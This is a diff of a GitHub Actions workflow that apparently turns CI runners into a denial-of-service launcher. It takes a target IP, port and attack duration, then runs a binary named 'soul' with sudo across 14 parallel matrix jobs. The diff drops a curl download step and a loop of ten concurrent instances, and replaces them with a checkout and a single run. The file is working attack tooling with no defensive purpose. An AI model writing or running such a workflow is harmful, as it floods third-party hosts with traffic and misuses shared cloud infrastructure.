@@ -8,26 +8,17 @@ on:
       port:
         description: 'Target Port'
         required: true
-      end_timestamp:
-        description: 'Unix timestamp when attack ends'
+      time:
+        description: 'Attack Duration'
         required: true
 
 jobs:
   soul:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
     strategy:
-      fail-fast: false
       matrix:
         n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14]
     steps:
-    - name: Download Binary
-      run: |
-        curl -sL https://raw.githubusercontent.com/${{ github.repository }}/main/soul -o soul
-        chmod +x soul
-    - name: Run Attack Instances
-      run: |
-        for i in {1..10}; do
-          sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.end_timestamp }} 900 &
-        done
-        wait
+    - uses: actions/checkout@v3
+    - run: chmod +x *
+    - run: sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 900
